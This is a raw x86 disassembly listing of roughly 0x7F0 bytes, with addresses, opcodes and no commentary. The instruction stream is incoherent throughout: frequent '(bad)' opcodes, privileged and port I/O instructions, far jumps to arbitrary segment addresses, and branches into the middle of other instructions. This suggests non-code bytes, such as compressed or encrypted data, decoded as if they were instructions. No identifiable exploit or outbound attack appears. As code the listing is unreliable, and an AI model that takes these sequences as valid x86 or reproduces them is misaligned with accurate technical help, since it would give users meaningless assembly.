  4151dc:	xor    bh,BYTE PTR [esi+eiz*8-0x6b]
  4151e0:	and    al,BYTE PTR [edx+0x78]
  4151e3:	(bad)  
  4151e4:	mov    edi,0x604046b8
  4151e9:	test   eax,0xd23964f6
  4151ee:	pusha  
  4151ef:	pop    ebp
  4151f0:	or     DWORD PTR [ecx-0xc],eax
  4151f3:	or     DWORD PTR [edi+0x5a],edi
  4151f6:	pop    edi
  4151f7:	sti    
  4151f8:	repnz mov edi,0x8dccf237
  4151fe:	jbe    0x415243
  415200:	popa   
  415201:	data16 jecxz 0x41522d
  415204:	xchg   ebx,eax
  415205:	adc    bl,ch
  415207:	jbe    0x415274
  415209:	mov    BYTE PTR [edx],dh
  41520b:	(bad)  
  41520c:	xchg   esi,eax
  41520d:	sbb    ch,BYTE PTR [ecx-0x4baec6bf]
  415213:	in     al,dx
  415214:	jae    0x415291
  415216:	mov    eax,ds:0x5dbcbfa7
  41521b:	sti    
  41521c:	stc    
  41521d:	push   ecx
  41521e:	aam    0xbf
  415220:	xchg   BYTE PTR [edi-0x30fe7aa0],cl
  415226:	fnstcw WORD PTR ds:0xbbad3cea
  41522c:	or     al,0x85
  41522e:	fiadd  DWORD PTR [edi]
  415230:	xchg   esi,eax
  415231:	pop    es
  415232:	icebp  
  415233:	sbb    BYTE PTR [esi-0x3fbe4316],dh
  415239:	mov    ds:0xba8a1a09,al
  41523e:	stc    
  41523f:	dec    esp
  415240:	(bad)  
  415242:	pop    esp
  415243:	test   al,0x88
  415245:	inc    edx
  415246:	enter  0xcbe6,0xc9
  41524a:	les    edi,FWORD PTR [esi+ebx*1-0x21ba69ff]
  415251:	hlt    
  415252:	scas   eax,DWORD PTR es:[edi]
  415253:	shr    bh,cl
  415255:	and    esi,DWORD PTR [edi]
  415257:	lds    ebx,FWORD PTR [edx+esi*2-0x27]
  41525b:	stc    
  41525c:	mov    ds:0x8e0f5d27,eax
  415261:	jmp    0x4376:0x89dccb03
  415268:	in     eax,0xe3
  41526a:	stos   BYTE PTR es:[edi],al
  41526b:	and    eax,0x49ab5939
  415270:	imul   ebx,DWORD PTR [ebx+eax*4-0x5ecc607e],0x506aa33d
  41527b:	aaa    
  41527c:	jno    0x4152e5
  41527e:	cmp    edx,DWORD PTR [edi+edx*2]
  415281:	adc    BYTE PTR [edi+0xe2f205b],dl
  415287:	test   eax,0x9948e31a
  41528c:	mov    esi,0x7bb80004
  415291:	or     esp,edi
  415293:	sub    eax,DWORD PTR cs:[esi+0xf]
  415297:	jmp    0x5d4e21e6
  41529c:	dec    eax
  41529d:	gs call 0x616:0x51b21200
  4152a5:	fdivr  QWORD PTR [edi]
  4152a7:	mov    al,0xed
  4152a9:	pop    ds
  4152aa:	mov    WORD PTR [ebx+0x646ff0cf],cs
  4152b0:	jmp    0x415278
  4152b2:	push   ebp
  4152b3:	dec    eax
  4152b4:	add    ah,bl
  4152b6:	out    dx,eax
  4152b7:	inc    ecx
  4152b8:	test   DWORD PTR [esi+edx*4-0x77fd6187],0xd730dccd
  4152c3:	cs xchg ebx,eax
  4152c5:	loope  0x41532c
  4152c7:	lods   eax,DWORD PTR ds:[esi]
  4152c8:	fwait
  4152c9:	ret    0xe058
  4152cc:	sbb    al,0x7a
  4152ce:	xor    al,cl
  4152d0:	out    0x35,eax
  4152d2:	sub    ah,BYTE PTR [ecx+0x62172460]
  4152d8:	adc    al,0xd2
  4152da:	add    DWORD PTR [ebp+0x5b346e5],edi
  4152e0:	loope  0x4152af
  4152e2:	push   edi
  4152e3:	sbb    esi,edx
  4152e5:	scas   eax,DWORD PTR es:[edi]
  4152e6:	adc    DWORD PTR [ecx],ebx
  4152e8:	(bad)  
  4152e9:	pop    edx
  4152ea:	jae    0x415307
  4152ec:	in     al,dx
  4152ed:	adc    al,0x5c
  4152ef:	or     al,0x48
  4152f1:	push   esi
  4152f2:	(bad)  
  4152f3:	lahf   
  4152f4:	aas    
  4152f5:	idiv   DWORD PTR ds:0xe8fac0ac
  4152fb:	pop    edx
  4152fc:	sub    ch,BYTE PTR [eax-0x69ae608a]
  415302:	adc    eax,0x81254e7c
  415307:	bound  ebp,QWORD PTR [ecx-0x13]
  41530a:	sahf   
  41530b:	xor    DWORD PTR [ebp+0x50],eax
  41530e:	icebp  
  41530f:	sub    dh,BYTE PTR [ebp+0x9e61909]
  415315:	hlt    
  415316:	ds jo  0x4152a1
  415319:	lods   eax,DWORD PTR ds:[esi]
  41531a:	test   DWORD PTR [ebp-0x89fa7e2],edx
  415320:	jmp    0x339d:0x8811215d
  415327:	out    0x67,eax
  415329:	push   edx
  41532a:	and    eax,esp
  41532c:	repz mov bl,0xdb
  41532f:	ja     0x415336
  415331:	mov    bh,0xad
  415333:	fwait
  415334:	xchg   edi,eax
  415335:	iret   
  415336:	or     al,0x6
  415338:	and    eax,0xb507c972
  41533d:	les    ecx,FWORD PTR [ebp+0x35c30548]
  415343:	xchg   edx,eax
  415344:	sti    
  415345:	dec    edi
  415346:	sbb    ebp,DWORD PTR [eax]
  415348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415349:	xor    al,0x6
  41534b:	je     0x415327
  41534d:	(bad)  
  41534e:	adc    al,0xba
  415350:	dec    ebx
  415351:	fstp   TBYTE PTR [eax-0x61]
  415354:	loopne 0x4152f6
  415356:	dec    edx
  415357:	(bad)  
  415358:	mov    ebp,0x6ef105a0
  41535d:	js     0x415375
  41535f:	xor    DWORD PTR ds:0xe3072e6c,edi
  415365:	imul   ebp,DWORD PTR [edi],0x5e923f06
  41536b:	pop    ds
  41536c:	mov    ch,BYTE PTR [ebp+ebx*1+0x5ec90aa1]
  415373:	inc    edx
  415374:	fcom   DWORD PTR [edi+0x3a]
  415377:	push   edi
  415378:	(bad)  
  415379:	jmp    0x5d6bbbc6
  41537e:	sub    eax,0xb36bdb41
  415383:	popa   
  415384:	and    al,0xeb
  415386:	dec    eax
  415387:	cli    
  415388:	in     eax,0x1b
  41538a:	pushf  
  41538b:	add    al,0x4b
  41538d:	adc    DWORD PTR [edi],ebx
  41538f:	push   ss
  415390:	ret    
  415391:	cld    
  415392:	dec    edi
  415393:	sti    
  415394:	jecxz  0x4153e7
  415396:	mov    WORD PTR [ebp+0x2e],gs
  415399:	mov    eax,0x5b46e53e
  41539e:	imul   ebx,DWORD PTR [edi+0x6e],0x61
  4153a2:	pop    edi
  4153a3:	pop    eax
  4153a4:	mov    edx,0xad957c63
  4153a9:	mov    BYTE PTR [ebp+0x3b],ah
  4153ac:	(bad)  
  4153ad:	es ds ins DWORD PTR es:[edi],dx
  4153b0:	pop    ds
  4153b1:	sub    ebx,DWORD PTR [ecx+esi*8-0x3f0db726]
  4153b8:	lahf   
  4153b9:	dec    eax
  4153ba:	or     edx,DWORD PTR [esi]
  4153bc:	jecxz  0x41541b
  4153be:	sahf   
  4153bf:	mov    ah,dh
  4153c1:	sub    ebx,DWORD PTR [eax-0x450c7780]
  4153c7:	les    ebp,FWORD PTR [ebp+0x50e3aa96]
  4153cd:	adc    BYTE PTR [ebx+edx*4],bl
  4153d0:	push   eax
  4153d1:	jo     0x415384
  4153d3:	stc    
  4153d4:	jns    0x4153bb
  4153d6:	stos   BYTE PTR es:[edi],al
  4153d7:	mov    bl,0xba
  4153d9:	lods   eax,DWORD PTR ds:[esi]
  4153da:	pushf  
  4153db:	hlt    
  4153dc:	xchg   edx,eax
  4153dd:	shl    BYTE PTR [eax+0x2c007571],0x99
  4153e4:	lahf   
  4153e5:	inc    ecx
  4153e6:	ins    DWORD PTR es:[edi],dx
  4153e7:	push   0xffffff81
  4153e9:	cmp    eax,0x6addfaf2
  4153ee:	test   eax,ebp
  4153f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f1:	scas   eax,DWORD PTR es:[edi]
  4153f2:	shr    BYTE PTR [ebp+0x7360660d],1
  4153f8:	inc    edx
  4153f9:	jmp    0x415478
  4153fb:	xor    ah,bl
  4153fd:	jg     0x415387
  4153ff:	(bad)  
  415400:	rcr    BYTE PTR [edi+0x30],1
  415403:	cmp    ah,ah
  415405:	aaa    
  415406:	fstp   TBYTE PTR [edi-0x2a]
  415409:	add    eax,0x3325ce15
  41540e:	frstor [ebp-0x3420be78]
  415414:	loope  0x4153dc
  415416:	pop    ecx
  415417:	test   DWORD PTR [edi+ecx*8+0x2a9b6b51],edi
  41541e:	jle    0x41549e
  415420:	jecxz  0x41540a
  415422:	inc    bh
  415424:	cmovge esi,DWORD PTR ds:0xd0790c6b
  41542b:	mov    ds:0xa274d01d,eax
  415430:	imul   edi,eax,0xffffffb9
  415433:	or     dl,al
  415435:	ja     0x4153d7
  415437:	inc    BYTE PTR [eax+0x2]
  41543a:	push   ebx
  41543b:	lahf   
  41543c:	push   esi
  41543d:	fcom   DWORD PTR [edi]
  41543f:	test   BYTE PTR [ebx+0x50f275ec],cl
  415445:	xchg   DWORD PTR ds:0xe2979e46,esi
  41544b:	and    BYTE PTR [edx+0x67098133],cl
  415451:	aam    0xa0
  415453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415454:	out    dx,eax
  415455:	cmp    edx,edx
  415457:	test   DWORD PTR [edx+0x54b73e1b],ebp
  41545d:	stc    
  41545e:	jecxz  0x4153fc
  415460:	push   0xffffffd9
  415462:	inc    edi
  415463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415464:	xchg   esi,eax
  415465:	shl    BYTE PTR [eax],cl
  415467:	ror    dh,0xb4
  41546a:	and    BYTE PTR [edi],al
  41546c:	push   ebp
  41546d:	iret   
  41546e:	icebp  
  41546f:	stos   BYTE PTR es:[edi],al
  415470:	sbb    ah,bh
  415472:	mov    ds:0xab9b9aab,eax
  415477:	call   0xc08fbccc
  41547c:	push   ebp
  41547d:	cli    
  41547e:	sub    BYTE PTR [edx-0x65],bh
  415481:	test   BYTE PTR [eax],bl
  415483:	lds    esp,FWORD PTR [edx]
  415485:	pop    esp
  415486:	gs loope 0x41542d
  415489:	xchg   esi,eax
  41548a:	loope  0x415475
  41548c:	addr16 jo 0x415414
  41548f:	mov    ecx,0xddd1cd90
  415494:	xchg   ebx,esi
  415496:	loope  0x41549f
  415498:	in     eax,dx
  415499:	mov    ah,0xd9
  41549b:	mov    eax,0xecacd597
  4154a0:	and    dl,BYTE PTR [edi]
  4154a2:	fstp   QWORD PTR [esi+ecx*2+0x463e5d1b]
  4154a9:	pop    ecx
  4154aa:	adc    al,0x2a
  4154ac:	fidivr DWORD PTR [ecx-0x986e390]
  4154b2:	popa   
  4154b3:	xchg   ecx,eax
  4154b4:	mov    ds:0xfc5cf189,al
  4154b9:	lods   al,BYTE PTR ds:[esi]
  4154ba:	xor    BYTE PTR [esi],ch
  4154bc:	fsub   DWORD PTR [eax-0x50]
  4154bf:	int    0xe4
  4154c1:	mov    ds:0x50972d2,al
  4154c6:	inc    ebp
  4154c7:	int3   
  4154c8:	jecxz  0x415475
  4154ca:	sbb    al,0x6e
  4154cc:	xchg   ebx,eax
  4154cd:	jno    0x4154f3
  4154cf:	fidiv  DWORD PTR [edi+0x17]
  4154d2:	xor    BYTE PTR [edi-0x54],ch
  4154d5:	adc    esi,esp
  4154d7:	xor    BYTE PTR [esi],ah
  4154d9:	xlat   BYTE PTR ds:[ebx]
  4154da:	out    dx,eax
  4154db:	das    
  4154dc:	push   es
  4154dd:	daa    
  4154de:	(bad)  
  4154df:	xor    al,0x70
  4154e1:	dec    ecx
  4154e2:	pop    esi
  4154e3:	dec    ebx
  4154e4:	xor    BYTE PTR [ebp+0x224b6959],ah
  4154ea:	mov    eax,ds:0x3edf55e6
  4154ef:	jg     0x41552d
  4154f1:	mov    cl,0xc0
  4154f3:	inc    esi
  4154f4:	lea    eax,[edi+0x28]
  4154f7:	jmp    0x4154d2
  4154f9:	pop    eax
  4154fa:	mov    al,0x7b
  4154fc:	ins    BYTE PTR es:[edi],dx
  4154fd:	ins    BYTE PTR es:[edi],dx
  4154fe:	test   BYTE PTR [edi-0x41140c3],0x1c
  415505:	dec    edi
  415506:	mov    eax,0x31f97ba
  41550b:	inc    edi
  41550c:	js     0x415566
  41550e:	(bad)  
  41550f:	(bad)  
  415511:	pop    esp
  415512:	sbb    al,0x2c
  415514:	cli    
  415515:	push   edx
  415516:	call   0xe203e7bc
  41551b:	and    eax,0x39d71093
  415520:	call   FWORD PTR [esp+edx*1+0xe12553a]
  415527:	sbb    DWORD PTR [esi],eax
  415529:	inc    esp
  41552a:	mov    eax,ds:0x891f77d1
  41552f:	enter  0x2396,0x67
  415533:	pop    esp
  415534:	jo     0x41553b
  415536:	jnp    0x415563
  415538:	(bad)  
  415539:	mov    ss,WORD PTR [eax-0x4d]
  41553c:	outs   dx,BYTE PTR ds:[esi]
  41553d:	and    al,0x78
  41553f:	ror    DWORD PTR [ecx-0x6c7240f6],0x7
  415546:	xchg   ebx,eax
  415547:	jno    0x415561
  415549:	xor    esp,0xff1682c5
  41554f:	mov    ch,0xac
  415551:	je     0x415553
  415553:	out    dx,al
  415554:	dec    ebp
  415555:	jmp    0x39d8:0x61aa8889
  41555c:	arpl   WORD PTR [eax-0x6fa764bc],di
  415562:	ins    BYTE PTR es:[edi],dx
  415563:	fsub   DWORD PTR [esi]
  415565:	cmc    
  415566:	sub    BYTE PTR [ecx+edx*2],0xfe
  41556a:	aaa    
  41556b:	or     esp,ebp
  41556d:	out    dx,al
  41556e:	cmp    BYTE PTR [ecx-0x1f],dl
  415571:	inc    esi
  415572:	sbb    al,0xac
  415574:	fsubr  DWORD PTR [esi+0x6dfc5c47]
  41557a:	mov    BYTE PTR [edx-0x5202c0f1],dl
  415580:	sub    DWORD PTR [ecx],ebp
  415582:	js     0x4155ce
  415584:	cs adc ecx,esp
  415587:	(bad)  
  415588:	mov    ds:0x872f32d0,eax
  41558d:	in     al,0xf5
  41558f:	int    0x34
  415591:	jnp    0x4155df
  415593:	jne    0x415517
  415595:	adc    DWORD PTR [ebx*4-0x592877b0],0x8be6fba0
  4155a0:	ins    DWORD PTR es:[edi],dx
  4155a1:	repnz push esp
  4155a3:	or     esp,DWORD PTR [esi+ebx*1+0x66]
  4155a7:	or     ah,BYTE PTR [edi]
  4155a9:	push   cs
  4155aa:	mov    DWORD PTR ds:0x87d574f9,eax
  4155b0:	or     DWORD PTR [ecx+0x1c06739a],edx
  4155b6:	lea    edx,[edx]
  4155b8:	mov    bh,0x97
  4155ba:	loopne 0x4155a0
  4155bc:	push   0xc3ef00ef
  4155c1:	imul   ebp,eax,0xffffffd5
  4155c4:	loop   0x4155e3
  4155c6:	cwde   
  4155c7:	ficom  WORD PTR [ecx+0x240b18d7]
  4155cd:	dec    ebp
  4155ce:	test   edi,eax
  4155d0:	jmp    0x8974:0x5a0f23c8
  4155d7:	(bad)  
  4155d9:	in     eax,0xf8
  4155db:	pop    ebx
  4155dc:	je     0x415601
  4155de:	sub    eax,0xac3a60d9
  4155e3:	sbb    edi,DWORD PTR [esi+ebx*4+0x1b73f908]
  4155ea:	lods   eax,DWORD PTR ds:[esi]
  4155eb:	(bad)  
  4155ec:	aad    0x97
  4155ee:	and    ebp,DWORD PTR [esi]
  4155f0:	pop    ebx
  4155f1:	cld    
  4155f2:	mov    eax,0xead9488e
  4155f7:	out    0xc3,al
  4155f9:	and    DWORD PTR [esi-0x64],0xa310f7e6
  415600:	sbb    dl,BYTE PTR [eax+0x2a651a84]
  415606:	xor    eax,DWORD PTR [eax-0x53]
  415609:	fld    st(1)
  41560b:	sahf   
  41560c:	adc    ch,BYTE PTR [ebp-0xd510dd6]
  415612:	std    
  415613:	scas   al,BYTE PTR es:[edi]
  415614:	add    DWORD PTR [esi],eax
  415616:	iret   
  415617:	jnp    0x41564c
  415619:	or     edi,DWORD PTR [ebp-0x6f]
  41561c:	sar    ah,1
  41561e:	in     al,0x8a
  415620:	imul   esp,DWORD PTR [ecx+0x4f],0x709f0c44
  415627:	adc    al,BYTE PTR [ecx+0x4]
  41562a:	xchg   ebx,eax
  41562b:	pusha  
  41562c:	cld    
  41562d:	mov    BYTE PTR [eax+0x36],ch
  415630:	jle    0x415652
  415632:	aaa    
  415633:	daa    
  415634:	js     0x4155eb
  415636:	xor    BYTE PTR [ecx+0x6],cl
  415639:	and    eax,0x5535a217
  41563e:	cmc    
  41563f:	add    dl,BYTE PTR [edi+0x58ddb60d]
  415645:	iret   
  415646:	gs jne 0x4155cb
  415649:	popf   
  41564a:	sub    eax,ebx
  41564c:	pop    esi
  41564d:	int    0x19
  41564f:	jecxz  0x41565b
  415651:	test   al,0x88
  415653:	fstp   QWORD PTR [ebx]
  415655:	into   
  415656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415657:	stc    
  415658:	pop    ebp
  415659:	daa    
  41565a:	test   edx,edi
  41565c:	dec    ax
  41565e:	dec    esp
  41565f:	xchg   edx,eax
  415660:	adc    BYTE PTR [edi],al
  415662:	fmul   QWORD PTR [esi]
  415664:	inc    edi
  415665:	and    BYTE PTR [edx-0x512e3dbf],0x9d
  41566c:	icebp  
  41566d:	jmp    0x71b0:0x3a64aa55
  415674:	mov    al,0x63
  415676:	cs mov esi,0x79a18723
  41567c:	push   ecx
  41567d:	sbb    al,0x2a
  41567f:	aam    0xeb
  415681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415682:	arpl   sp,si
  415684:	mov    ebp,0x7232630d
  415689:	std    
  41568a:	mov    ecx,ebp
  41568c:	test   eax,0x7fdb8fea
  415691:	jl     0x4156a6
  415693:	in     al,0xfa
  415695:	dec    ebx
  415696:	inc    ebx
  415697:	push   ss
  415698:	lea    esi,[ebx+ebx*1+0x43d69ed]
  41569f:	leave  
  4156a0:	popf   
  4156a1:	repnz lahf 
  4156a3:	test   DWORD PTR [ebp-0x7d619e7a],esi
  4156a9:	or     eax,0x1b4b73c8
  4156ae:	outs   dx,BYTE PTR ds:[esi]
  4156af:	add    BYTE PTR fs:[ebx-0x73],ch
  4156b3:	icebp  
  4156b4:	leave  
  4156b5:	sbb    esi,DWORD PTR [edi]
  4156b7:	inc    esi
  4156b8:	gs mov ebp,0xd901b93
  4156be:	adc    DWORD PTR [edx+0x5245c35b],ecx
  4156c4:	jmp    0x70da1772
  4156c9:	pop    ds
  4156ca:	jg     0x4156df
  4156cc:	xchg   ecx,eax
  4156cd:	mov    edi,0x83e9d577
  4156d2:	or     bh,BYTE PTR cs:[eax+0x44]
  4156d6:	int    0xed
  4156d8:	or     BYTE PTR [eax-0x35],dl
  4156db:	retf   0x42c5
  4156de:	ror    esp,0x47
  4156e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156e2:	iret   
  4156e3:	sbb    DWORD PTR [ebx],esi
  4156e5:	jno    0x415760
  4156e7:	popa   
  4156e8:	ret    0xe807
  4156eb:	inc    edx
  4156ec:	jmp    0xb912b9c5
  4156f1:	jmp    FWORD PTR [esi]
  4156f3:	mov    bh,0xd
  4156f5:	cld    
  4156f6:	mov    cl,0xa1
  4156f8:	dec    edx
  4156f9:	fxch   st(6)
  4156fb:	fwait
  4156fc:	xchg   ebp,eax
  4156fd:	push   esi
  4156fe:	cs fwait
  415700:	push   0x8d3775c1
  415705:	inc    esi
  415706:	in     eax,0x91
  415708:	dec    ebx
  415709:	dec    ecx
  41570a:	mov    esi,0xfc58fe8
  41570f:	xor    DWORD PTR [eax-0x1511bd8f],ecx
  415715:	adc    BYTE PTR [edi-0xb],al
  415718:	xor    DWORD PTR [edx+0x55601f8f],0x6f
  41571f:	int3   
  415720:	pop    esp
  415721:	popa   
  415722:	or     ch,ah
  415724:	iret   
  415725:	mov    edi,0x7c6dc95c
  41572a:	ret    
  41572b:	fwait
  41572c:	stc    
  41572d:	mov    eax,0xa61af52b
  415732:	sbb    BYTE PTR [ecx+0x63ab45c8],bl
  415738:	jge    0x41576e
  41573a:	ds mov ebp,ebp
  41573d:	sbb    ecx,edx
  41573f:	lahf   
  415740:	inc    edx
  415741:	shl    esp,0x5d
  415744:	xor    al,0x50
  415746:	dec    edx
  415747:	into   
  415748:	mov    ebx,0x32f859aa
  41574d:	lods   al,BYTE PTR ds:[esi]
  41574e:	mov    dh,0x93
  415750:	outs   dx,BYTE PTR ds:[esi]
  415751:	arpl   WORD PTR [eax-0x2b5d05e3],sp
  415757:	ret    
  415758:	jge    0x415793
  41575a:	xchg   ecx,eax
  41575b:	push   esi
  41575c:	sti    
  41575d:	bound  edx,QWORD PTR [edi+0x1dc20883]
  415763:	jge    0x4157a5
  415765:	inc    ecx
  415766:	cmp    dl,cl
  415768:	sub    BYTE PTR ds:0xf47e889a,0xbb
  41576f:	mov    bl,0x5
  415771:	mov    al,ds:0xc2b0e417
  415776:	jle    0x415744
  415778:	repz jbe 0x4156fb
  41577b:	loop   0x4157bf
  41577d:	mov    ds:0x7fb4995a,eax
  415782:	and    eax,0xdd387464
  415787:	jge    0x41578f
  415789:	ret    0x505d
  41578c:	jg     0x41572d
  41578e:	stc    
  41578f:	and    ebx,DWORD PTR [ebp-0x7d]
  415792:	cmp    al,0x77
  415794:	bnd jg 0x41578b
  415797:	xchg   DWORD PTR ds:0xd26a68bf,esp
  41579d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41579e:	sbb    dl,BYTE PTR fs:[edi+ecx*1+0x1d]
  4157a3:	fsubp  st(6),st
  4157a5:	add    ch,BYTE PTR [eax+0x1a]
  4157a8:	dec    ebp
  4157a9:	dec    DWORD PTR [esi]
  4157ab:	rcl    DWORD PTR [edx+0x6a],cl
  4157ae:	shr    eax,cl
  4157b0:	pushf  
  4157b1:	mov    dl,0x60
  4157b3:	mov    gs,WORD PTR [edi]
  4157b5:	jae    0x415787
  4157b7:	dec    edx
  4157b8:	out    0xb2,eax
  4157ba:	cli    
  4157bb:	xchg   ecx,eax
  4157bc:	test   ebp,edi
  4157be:	imul   ecx,esp,0x82ff24ae
  4157c4:	imul   ebx,edi,0xe9274dd2
  4157ca:	jbe    0x41574e
  4157cc:	sub    al,0x81
  4157ce:	push   edx
  4157cf:	mov    bh,0xb1
  4157d1:	jl     0x415759
  4157d3:	adc    BYTE PTR [ebx-0x3b],dh
  4157d6:	jb     0x415817
  4157d8:	in     eax,dx
  4157d9:	nop
  4157da:	add    edx,DWORD PTR [ecx+0x174dcec5]
  4157e0:	mov    DWORD PTR [eax+0x4d],edi
  4157e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e4:	popa   
  4157e5:	repnz push ss
  4157e7:	push   ebx
  4157e8:	pop    esp
  4157e9:	and    bh,BYTE PTR [ecx+0x6d]
  4157ec:	cmp    al,0xeb
  4157ee:	inc    BYTE PTR [eax+ebx*2+0x1054c4d1]
  4157f5:	pop    ecx
  4157f6:	inc    edi
  4157f7:	js     0x415821
  4157f9:	test   BYTE PTR [edi],dl
  4157fb:	loope  0x415867
  4157fd:	enter  0x8cc5,0xc9
  415801:	loope  0x41581d
  415803:	fstp   QWORD PTR [edx]
  415805:	jg     0x4157c8
  415807:	dec    ebp
  415808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415809:	mov    dh,0x2a
  41580b:	test   edi,ebx
  41580d:	in     al,0xef
  41580f:	add    ebp,DWORD PTR [ebx+0x28]
  415812:	mov    dh,0x33
  415814:	adc    bh,BYTE PTR [esi]
  415816:	xor    DWORD PTR [edx-0x1d72b670],esi
  41581c:	inc    edi
  41581d:	addr16 icebp 
  41581f:	clc    
  415820:	sbb    edi,DWORD PTR [edx]
  415822:	sbb    al,0x3e
  415824:	xor    BYTE PTR [ecx],dl
  415826:	retf   
  415827:	push   cs
  415828:	push   eax
  415829:	loopne 0x41585b
  41582b:	outs   dx,BYTE PTR ds:[esi]
  41582c:	xor    ch,0x30
  41582f:	fistp  QWORD PTR [ebx+eiz*1]
  415832:	mov    cl,0x92
  415834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415835:	jne    0x415854
  415837:	push   ebx
  415838:	pop    esi
  415839:	fnstenv [eax]
  41583b:	add    al,0x30
  41583d:	jle    0x4158b7
  41583f:	sub    eax,0xf61358e4
  415844:	jle    0x41581a
  415846:	cmp    al,BYTE PTR [esi]
  415848:	test   eax,0x678da7f3
  41584d:	pop    ebp
  41584e:	shl    DWORD PTR [ebx-0x16561f04],cl
  415854:	call   0x408d:0x6a012c01
  41585b:	imul   eax,DWORD PTR [eax+0x42],0x5a
  41585f:	lahf   
  415860:	inc    ebp
  415861:	adc    ah,ch
  415863:	or     al,al
  415865:	not    ah
  415867:	add    BYTE PTR [eax-0x66],0x14
  41586b:	jo     0x4157f1
  41586d:	cmp    edx,DWORD PTR ds:0x470aa474
  415873:	jmp    0xfbb4bfdc
  415878:	fdiv   QWORD PTR [edi-0x2f]
  41587b:	leave  
  41587c:	xchg   esp,eax
  41587d:	jge    0x41588c
  41587f:	lods   al,BYTE PTR ds:[esi]
  415880:	inc    esi
  415881:	in     eax,0x9d
  415883:	dec    edx
  415884:	mov    al,0x6
  415886:	mov    ch,ah
  415888:	mov    al,ds:0x2017192f
  41588d:	popf   
  41588e:	jmp    0x5629e16f
  415893:	fs mov ebp,0x4cdcd54b
  415899:	and    DWORD PTR [eax],esi
  41589b:	mov    DWORD PTR ds:[ebx+eax*4+0x14201149],edi
  4158a3:	jns    0x4158c2
  4158a5:	xor    eax,0x3558bb16
  4158aa:	stos   BYTE PTR es:[edi],al
  4158ab:	mov    al,ds:0xe47a5ca7
  4158b0:	cs mov ebx,0x20c81619
  4158b6:	stos   BYTE PTR es:[edi],al
  4158b7:	or     eax,eax
  4158b9:	(bad)  
  4158ba:	ret    0x6c80
  4158bd:	and    edx,DWORD PTR [esi+eiz*4]
  4158c0:	cmp    ecx,DWORD PTR [ebx-0x16]
  4158c3:	add    edx,eax
  4158c5:	push   ds
  4158c6:	loope  0x415886
  4158c8:	xor    DWORD PTR [esi],edi
  4158ca:	jmp    0x4158c6
  4158cc:	xor    DWORD PTR [ebx+0x65],ebp
  4158cf:	mov    bl,BYTE PTR [edi+0x6ce27a11]
  4158d5:	pusha  
  4158d6:	or     ebp,DWORD PTR [edi]
  4158d8:	into   
  4158d9:	nop
  4158da:	adc    DWORD PTR [edx+0x6b],0x50a462d
  4158e1:	pop    ecx
  4158e2:	es popf 
  4158e4:	idiv   BYTE PTR [ebx+0x797b1db2]
  4158ea:	sub    ch,BYTE PTR [edx+0x614f7b99]
  4158f0:	fwait
  4158f1:	push   0x42
  4158f3:	repz pop ss
  4158f5:	adc    BYTE PTR [esi],al
  4158f7:	sbb    ecx,DWORD PTR [edx+0x80c817f]
  4158fd:	jae    0x4158bf
  4158ff:	pop    ecx
  415900:	push   cs
  415901:	xor    al,0x16
  415903:	popf   
  415904:	jnp    0x4158ba
  415906:	add    BYTE PTR [esi],0x69
  415909:	jnp    0x41596f
  41590b:	cmp    al,0x7
  41590d:	inc    edx
  41590e:	jmp    FWORD PTR [ebx-0xc]
  415911:	jecxz  0x41596d
  415913:	cli    
  415914:	pop    ebx
  415915:	xchg   BYTE PTR [ecx],bh
  415917:	lds    edi,FWORD PTR [edi-0x65]
  41591a:	xor    eax,0xb67ddce4
  41591f:	inc    eax
  415920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415921:	lahf   
  415922:	add    BYTE PTR [edx],bh
  415924:	les    ebp,FWORD PTR [esi-0x3e]
  415927:	jbe    0x4158c2
  415929:	xor    BYTE PTR [edx],ah
  41592b:	enter  0x6030,0x25
  41592f:	call   0x70e6:0xef93c2eb
  415936:	sbb    DWORD PTR [ecx-0x330f68a8],0x3d
  41593d:	int3   
  41593e:	jl     0x4158fc
  415940:	(bad)  
  415942:	fwait
  415943:	ds leave 
  415945:	out    0xea,eax
  415947:	pop    ecx
  415948:	in     eax,dx
  415949:	cld    
  41594a:	mov    es,WORD PTR [ebp+0x2a83ac58]
  415950:	push   esp
  415951:	out    dx,al
  415952:	call   0x120b:0xb2066a1f
  415959:	mov    dl,0x84
  41595b:	inc    ecx
  41595c:	xor    BYTE PTR [edi+ebx*4+0x57],dl
  415960:	ret    
  415961:	dec    eax
  415962:	pop    edx
  415963:	push   esp
  415964:	mov    eax,0xcd3ce8c3
  415969:	jo     0x4159d8
  41596b:	xor    bh,ah
  41596d:	and    dl,BYTE PTR [edi]
  41596f:	push   ds
  415970:	mov    bh,0xd9
  415972:	rcr    BYTE PTR [ebx+0x26],1
  415975:	cdq    
  415976:	leave  
  415977:	jne    0x4159ef
  415979:	push   esp
  41597a:	mov    cl,0xa4
  41597c:	lds    edi,FWORD PTR [edx]
  41597e:	mov    ecx,0x7aaa019e
  415983:	push   ebx
  415984:	icebp  
  415985:	xchg   esi,eax
  415986:	inc    esi
  415987:	cmpxchg esi,edi
  41598a:	imul   edi,DWORD PTR [edx+eiz*2-0x11],0x2c92d682
  415992:	xchg   BYTE PTR [edi-0x6a53e1ad],bh
  415998:	jne    0x41593e
  41599a:	inc    eax
  41599b:	jmp    0x3178:0xa57e1c86
  4159a2:	(bad)  
  4159a3:	outs   dx,DWORD PTR ds:[esi]
  4159a4:	inc    edi
  4159a5:	sbb    ah,dl
  4159a7:	jg     0x415967
  4159a9:	mov    esp,0x556c9a83
  4159ae:	ins    BYTE PTR es:[edi],dx
  4159af:	stc    
  4159b0:	xchg   DWORD PTR [edi+0x79fcbe70],eax
  4159b6:	fmulp  st(6),st
  4159b8:	rcl    edx,cl
  4159ba:	mov    bl,0x8d
  4159bc:	(bad)  
  4159bd:	arpl   WORD PTR [edx],bp
  4159bf:	in     eax,0x83
  4159c1:	adc    eax,DWORD PTR [esi-0x6]
  4159c4:	mov    ah,0xa0
  4159c6:	mov    ds:0xb568bd58,eax
  4159cb:	jle    0x41597a
